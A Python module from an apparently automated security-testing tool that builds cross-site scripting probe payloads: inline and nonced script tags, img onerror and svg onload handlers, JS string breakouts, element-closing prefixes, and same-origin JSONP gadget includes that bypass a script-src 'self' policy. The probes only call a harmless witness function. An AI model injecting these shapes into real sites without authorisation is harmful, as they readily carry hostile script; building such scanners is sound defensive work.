"""CLINKZ-OWNED client-side witness payloads — the P7 carrier.

The structural counterpart to :mod:`clinkz.oob.templates`, and it departs from
the in-band "the LLM crafts the payload" pattern for the same reason:

* A methodology **selects** a :class:`ClientWitnessTemplateId` and a
  :class:`MarkupBreakout`. It **never authors the payload string**.
* The executable part of every template is one fixed expression —
  :func:`build_witness_expression` — whose only variables are a Clinkz-minted
  ``binding`` name and a Clinkz-minted ``nonce``. There is no template that
  reads the DOM, no template that touches storage, and no template that opens a
  network connection.

## How this differs from the P6 guardrail, deliberately

P6's carrier admits **no** target-derived data at all, because its channel
leaves the machine: anything interpolated there could be exfiltrated to a
collaborator. P7's channel is a function call inside a browser Clinkz owns and
throws away — nothing leaves. So two target-derived values are admitted here,
each for a reason that cannot be met any other way, and each shape-validated to
a character class that cannot break its own syntactic slot:

* ``csp_nonce`` — a nonce the target **published in its own policy**. Reusing it
  is the whole point of the static-nonce finding; the target already knows it.
* ``gadget_path`` / ``gadget_param`` — a **same-origin** endpoint the target
  serves. Validated as a rooted path with no scheme and no authority, so a
  gadget URL can never become an off-origin include.

Neither is prose, and neither reaches an interpolation slot where it could
escape into script. A value that fails its pattern raises :class:`ValueError`
rather than being sanitised into something that "looks close enough".

## What the payload proves

Executing ``window.<binding>('<nonce>')`` inside the page is the DEFINING effect
of cross-site scripting: attacker-supplied script running in the target origin.
The payload is a probe designed to be *witnessable*, exactly as a JNDI lookup
to a collaborator is a probe designed to be witnessable. It is not a
demonstration of impact beyond that, and this module claims nothing more.
"""

from __future__ import annotations

import re
import secrets
from enum import StrEnum
from urllib.parse import quote

from clinkz.oob.templates import is_valid_nonce

# The binding is the name of the Clinkz-owned function the payload calls. It is
# minted per page load (never fixed), so a page cannot carry code written against
# a known name. A JS identifier, deliberately narrower than the language allows.
_BINDING_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]{7,63}$")

# A CSP nonce as it may legally appear in a `nonce-` source expression: base64
# alphabet plus the URL-safe variants. No quote, no angle bracket, no whitespace —
# so it cannot terminate the attribute it is interpolated into.
_CSP_NONCE_RE = re.compile(r"^[A-Za-z0-9+/=_-]{1,128}$")

# A same-origin gadget path, optionally carrying its own query string: rooted,
# no scheme, no authority, no quote, no whitespace, no angle bracket. `#` is
# excluded too — a fragment would truncate the callback parameter we append,
# producing a payload that silently differs from the one the verdict names. The
# leading-`//` case is rejected separately because `//evil.tld/x` is a
# protocol-relative ABSOLUTE url that matches every other rule here, and is the
# one shape that would turn a same-origin include into an off-origin one.
_GADGET_PATH_RE = re.compile(r"^/[A-Za-z0-9._~!$&()*+,;=:@%/?-]{0,512}$")

# A query parameter name on that gadget.
_GADGET_PARAM_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_.-]{0,63}$")

#: Bytes of randomness behind a minted binding name.
_BINDING_BYTES = 8


class ClientWitnessTemplateId(StrEnum):
    """The CLINKZ-OWNED payload shape a methodology may SELECT (never author).

    Each id names one way an injected string becomes running script. Which one
    fits is a property of where the payload lands and of the policy in force —
    both observed, never guessed.

    * ``INLINE_SCRIPT`` — ``<script>`` with the witness expression inline. The
      simplest shape; blocked by any policy that does not permit inline script.
    * ``NONCED_INLINE_SCRIPT`` — the same, carrying a ``nonce`` attribute copied
      from the served policy. Confirms the **static/reused nonce** weakness: a
      nonce is only a control while it is unpredictable and per-response.
    * ``IMG_ONERROR`` / ``SVG_ONLOAD`` — event-handler shapes for a markup
      landing where a literal ``<script`` is filtered. Both fire without user
      interaction.
    * ``JS_STRING_BREAKOUT`` — for a landing already inside a JS string literal:
      close the string, run, comment out the remainder.
    * ``SAME_ORIGIN_SCRIPT_GADGET`` — a ``<script src>`` pointing at a
      same-origin endpoint that reflects a request parameter into its own
      JavaScript response (the classic JSONP-callback shape). This is the
      canonical bypass of a ``script-src 'self'`` policy: the browser is not
      being tricked, the policy genuinely permits the include.
    * ``SAME_ORIGIN_SCRIPT_GADGET_URL`` — the same gadget URL with **no tag**,
      for a landing that is already inside a script's ``src`` attribute. An
      application that asks for a script URL and drops it into ``<script
      src='…'>`` is a real and common shape, and emitting a full tag there
      produces a nested, mangled attribute that can never execute — so the
      distinction is between a working probe and a false negative.
    """

    INLINE_SCRIPT = "inline_script"
    NONCED_INLINE_SCRIPT = "nonced_inline_script"
    IMG_ONERROR = "img_onerror"
    SVG_ONLOAD = "svg_onload"
    JS_STRING_BREAKOUT = "js_string_breakout"
    SAME_ORIGIN_SCRIPT_GADGET = "same_origin_script_gadget"
    SAME_ORIGIN_SCRIPT_GADGET_URL = "same_origin_script_gadget_url"


class MarkupBreakout(StrEnum):
    """A fixed prefix that closes the element a reflection landed inside.

    A payload that lands inside ``<select>`` or ``<textarea>`` is inert until the
    enclosing element is closed, so the breakout is part of whether execution is
    even reachable. The vocabulary is CLINKZ-OWNED and closed: the methodology
    picks an entry from what it OBSERVED the reflection to be enclosed by, and
    no string from the page is ever concatenated into a payload.
    """

    NONE = "none"
    OPTION_SELECT = "option_select"
    TEXTAREA = "textarea"
    TITLE = "title"
    ATTRIBUTE_SINGLE = "attribute_single"
    ATTRIBUTE_DOUBLE = "attribute_double"
    HTML_COMMENT = "html_comment"


_BREAKOUT_PREFIX: dict[MarkupBreakout, str] = {
    MarkupBreakout.NONE: "",
    MarkupBreakout.OPTION_SELECT: "</option></select>",
    MarkupBreakout.TEXTAREA: "</textarea>",
    MarkupBreakout.TITLE: "</title>",
    MarkupBreakout.ATTRIBUTE_SINGLE: "'>",
    MarkupBreakout.ATTRIBUTE_DOUBLE: '">',
    MarkupBreakout.HTML_COMMENT: "-->",
}


def mint_binding_name() -> str:
    """Mint a fresh, per-page-load name for the Clinkz-owned witness function.

    Randomised rather than fixed so that the channel cannot be called by code
    written in advance against a known name. This is a hardening measure, not
    the security argument: the argument is that calling a function at all
    requires JavaScript to run, which inert reflected bytes cannot do.

    Returns:
        A JS identifier matching :data:`_BINDING_RE`.
    """
    return f"__clinkz_w_{secrets.token_hex(_BINDING_BYTES)}"


def is_valid_binding(value: str) -> bool:
    """Whether *value* is a shape-valid witness binding name."""
    return bool(_BINDING_RE.fullmatch(value or ""))


def build_witness_expression(binding: str, nonce: str) -> str:
    """Build the one JavaScript expression every P7 template executes.

    This is the whole executable surface of the primitive: a single call, on a
    Clinkz-minted name, carrying a Clinkz-minted nonce. It reads nothing, writes
    nothing, and connects to nothing.

    Args:
        binding: A :func:`mint_binding_name` value.
        nonce: A :func:`clinkz.oob.templates.mint_nonce` value.

    Returns:
        ``window.<binding>('<nonce>')``.

    Raises:
        ValueError: If either input is not shape-valid.
    """
    _require_binding(binding)
    _require_nonce(nonce)
    return f"window.{binding}('{nonce}')"


def build_witness_payload(
    template_id: ClientWitnessTemplateId,
    nonce: str,
    binding: str,
    *,
    breakout: MarkupBreakout = MarkupBreakout.NONE,
    csp_nonce: str | None = None,
    gadget_path: str | None = None,
    gadget_param: str | None = None,
) -> str:
    """Assemble a concrete client-side witness payload.

    The single chokepoint where a nonce becomes an injectable string. Every
    input is either a member of a closed Clinkz-owned enum or a
    shape-validated token; there is no parameter through which model prose,
    a response body, or a scan artefact could ride into the payload.

    Args:
        template_id: The CLINKZ-OWNED shape the methodology selected.
        nonce: A Clinkz-minted ``[a-z0-9]{16,64}`` nonce.
        binding: A Clinkz-minted witness binding name.
        breakout: Which enclosing element to close first (closed vocabulary).
        csp_nonce: Required by ``NONCED_INLINE_SCRIPT`` — the nonce the target
            published in its own ``script-src``.
        gadget_path: Required by ``SAME_ORIGIN_SCRIPT_GADGET`` — a rooted,
            same-origin path.
        gadget_param: Required by ``SAME_ORIGIN_SCRIPT_GADGET`` — the query
            parameter that endpoint reflects into its JavaScript response.

    Returns:
        The concrete payload string to inject.

    Raises:
        ValueError: If any input is not shape-valid, or a template's required
            argument is missing. Never silently degrades to a weaker shape — a
            payload that is not the one the caller asked for would make the
            verdict describe a probe that was never sent.
    """
    _require_binding(binding)
    _require_nonce(nonce)
    if breakout not in _BREAKOUT_PREFIX:
        raise ValueError(f"unknown markup breakout: {breakout!r}")

    expr = build_witness_expression(binding, nonce)
    prefix = _BREAKOUT_PREFIX[breakout]

    if template_id is ClientWitnessTemplateId.INLINE_SCRIPT:
        return f"{prefix}<script>{expr}</script>"

    if template_id is ClientWitnessTemplateId.NONCED_INLINE_SCRIPT:
        if not _CSP_NONCE_RE.fullmatch(csp_nonce or ""):
            raise ValueError(
                "NONCED_INLINE_SCRIPT requires a shape-valid csp_nonce read from "
                "the served policy (base64 source-expression alphabet)"
            )
        return f'{prefix}<script nonce="{csp_nonce}">{expr}</script>'

    if template_id is ClientWitnessTemplateId.IMG_ONERROR:
        return f'{prefix}<img src=x onerror="{expr}">'

    if template_id is ClientWitnessTemplateId.SVG_ONLOAD:
        return f'{prefix}<svg onload="{expr}">'

    if template_id is ClientWitnessTemplateId.JS_STRING_BREAKOUT:
        # Close a single-quoted string, run, and comment out whatever the sink
        # had after the injection point so the surrounding statement still parses.
        return f"';{expr};//"

    if template_id in (
        ClientWitnessTemplateId.SAME_ORIGIN_SCRIPT_GADGET,
        ClientWitnessTemplateId.SAME_ORIGIN_SCRIPT_GADGET_URL,
    ):
        path = _require_gadget_path(gadget_path)
        param = gadget_param or ""
        if not _GADGET_PARAM_RE.fullmatch(param):
            raise ValueError(f"{template_id.value} requires a shape-valid gadget_param name")
        # The gadget echoes the parameter and then calls it as a function with its
        # own data: `<param-value>({...})`. Trailing `;window.String` gives that
        # emitted call a harmless target, so the witness call is not followed by a
        # TypeError. Both halves are Clinkz-owned literals.
        callback = quote(f"{expr};window.String", safe="")
        sep = "&" if "?" in path else "?"
        gadget_url = f"{path}{sep}{param}={callback}"
        if template_id is ClientWitnessTemplateId.SAME_ORIGIN_SCRIPT_GADGET_URL:
            # The landing is already a script `src` attribute — emit the URL only.
            # No breakout prefix either: closing an element here would break out of
            # the very attribute that makes the include happen.
            return gadget_url
        return f'{prefix}<script src="{gadget_url}"></script>'

    raise ValueError(f"unknown client witness template id: {template_id!r}")


def _require_nonce(nonce: str) -> None:
    """Reject anything that is not a Clinkz-minted nonce."""
    if not is_valid_nonce(nonce):
        raise ValueError(
            "P7 nonce is not shape-valid [a-z0-9]{16,64} — refusing to build a "
            "witness payload from non-nonce data"
        )


def _require_binding(binding: str) -> None:
    """Reject anything that is not a Clinkz-minted binding name."""
    if not is_valid_binding(binding):
        raise ValueError(
            "P7 binding name is not a shape-valid JS identifier — refusing to "
            "build a witness payload"
        )


def _require_gadget_path(gadget_path: str | None) -> str:
    """Validate a same-origin gadget path, rejecting the protocol-relative case."""
    path = gadget_path or ""
    if path.startswith("//"):
        raise ValueError(
            "gadget_path is protocol-relative (`//host/...`), which resolves "
            "OFF-ORIGIN — refusing to build an include that leaves the target"
        )
    if not _GADGET_PATH_RE.fullmatch(path):
        raise ValueError(
            "SAME_ORIGIN_SCRIPT_GADGET requires a rooted same-origin path with "
            "no scheme, authority, quote or whitespace"
        )
    return path


__all__ = [
    "ClientWitnessTemplateId",
    "MarkupBreakout",
    "build_witness_expression",
    "build_witness_payload",
    "is_valid_binding",
    "mint_binding_name",
]
